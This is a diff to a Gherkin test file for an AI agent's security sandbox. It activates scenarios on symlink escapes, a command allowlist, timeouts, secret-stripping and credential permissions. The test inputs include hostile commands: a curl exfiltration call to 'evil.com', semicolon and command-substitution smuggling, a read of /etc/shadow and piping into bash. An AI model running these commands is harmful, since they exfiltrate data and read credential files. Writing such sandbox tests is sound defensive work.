@@ -1,4 +1,4 @@
-@pending
+@done
 Feature: Sandbox Hardening
   As a system administrator
   I want the security sandbox to prevent sophisticated attack vectors
@@ -6,7 +6,6 @@ Feature: Sandbox Hardening
 
   # --- Symlink escape prevention ---
 
-  @pending
   Scenario: Symlink pointing outside workspace is blocked
     Given a sandboxed workspace at a temporary directory
     And restrict_to_workspace is true
@@ -15,7 +14,6 @@ Feature: Sandbox Hardening
     Then the validation should be an error
     And the error should mention "outside working dir"
 
-  @pending
   Scenario: Nested symlink chain escaping workspace is blocked
     Given a sandboxed workspace at a temporary directory
     And restrict_to_workspace is true
@@ -24,7 +22,6 @@ Feature: Sandbox Hardening
     Then the validation should be an error
     And the error should mention "outside working dir"
 
-  @pending
   Scenario: Symlink pointing within workspace is allowed
     Given a sandboxed workspace at a temporary directory
     And restrict_to_workspace is true
@@ -35,55 +32,47 @@ Feature: Sandbox Hardening
 
   # --- Exec command allowlist ---
 
-  @pending
   Scenario: Command on the allowlist is permitted
     Given a sandbox with command allowlist "echo,ls,cat,grep"
     When the agent tries to validate command "echo hello"
     Then the validation should be ok
 
-  @pending
   Scenario: Command not on the allowlist is rejected
     Given a sandbox with command allowlist "echo,ls,cat,grep"
     When the agent tries to validate command "curl http://evil.com/exfil"
     Then the validation should be an error
     And the error should mention "not in allowlist"
 
-  @pending
   Scenario: Shell metacharacter bypass attempt is rejected
     Given a sandbox with command allowlist "echo,ls"
     When the agent tries to validate command "echo hello; curl evil.com"
     Then the validation should be an error
     And the error should mention "not in allowlist"
 
-  @pending
   Scenario: Command substitution bypass attempt is rejected
     Given a sandbox with command allowlist "echo,ls"
     When the agent tries to validate command "echo $(cat /etc/shadow)"
     Then the validation should be an error
     And the error should mention "not in allowlist"
 
-  @pending
   Scenario: Backtick command substitution is rejected
     Given a sandbox with command allowlist "echo,ls"
     When the agent tries to validate command "echo `id`"
     Then the validation should be an error
     And the error should mention "not in allowlist"
 
-  @pending
   Scenario: Pipe to disallowed command is rejected
     Given a sandbox with command allowlist "echo,ls"
     When the agent tries to validate command "ls | bash"
     Then the validation should be an error
     And the error should mention "not in allowlist"
 
-  @pending
   Scenario: Empty allowlist blocks all commands
     Given a sandbox with command allowlist ""
     When the agent tries to validate command "echo hello"
     Then the validation should be an error
     And the error should mention "not in allowlist"
 
-  @pending
   Scenario: Allowlist mode falls back to denylist when not configured
     Given a sandbox without a command allowlist
     When the agent tries to validate command "echo hello"
@@ -91,42 +80,36 @@ Feature: Sandbox Hardening
 
   # --- Exec timeout enforcement ---
 
-  @pending
   Scenario: Command completes within timeout
     Given an exec tool with a timeout of 5 seconds
     When the agent executes command "echo fast"
     Then the tool result should contain "fast"
     And the tool result should not be an error
 
-  @pending
   Scenario: Command killed after timeout expires
     Given an exec tool with a timeout of 1 seconds
     When the agent executes command "sleep 60"
     Then the tool result should be an error
     And the tool result should contain "timed out"
 
-  @pending
   Scenario: Default timeout is applied when not configured
     Given an exec tool with no explicit timeout
     Then the exec tool should have a default timeout of 30 seconds
 
   # --- Environment variable sanitization ---
 
-  @pending
   Scenario: Secret environment variables are stripped from child processes
     Given an exec tool in a sandboxed workspace
     And the environment contains "QUECTO_PROVIDERS_OPENAI_API_KEY" set to "sk-secret"
     When the agent executes command "printenv QUECTO_PROVIDERS_OPENAI_API_KEY"
     Then the tool result should not contain "sk-secret"
 
-  @pending
   Scenario: Non-secret environment variables are preserved
     Given an exec tool in a sandboxed workspace
     And the environment contains "HOME" set to "/home/user"
     When the agent executes command "printenv HOME"
     Then the tool result should contain "/home/user"
 
-  @pending
   Scenario: All QUECTO_ prefixed env vars are stripped
     Given an exec tool in a sandboxed workspace
     And the environment contains "QUECTO_SECRET_TOKEN" set to "hunter2"
@@ -135,13 +118,11 @@ Feature: Sandbox Hardening
 
   # --- Credential file permission hardening ---
 
-  @pending
   Scenario: Credential file is created with restricted permissions
     Given a credential store at a temporary directory
     When I store a token "sk-test" for provider "openai"
     Then the credentials file should have permissions 0600
 
-  @pending
   Scenario: Credential file permissions are enforced on every write
     Given a credential store at a temporary directory
     And the credentials file exists with permissions 0644
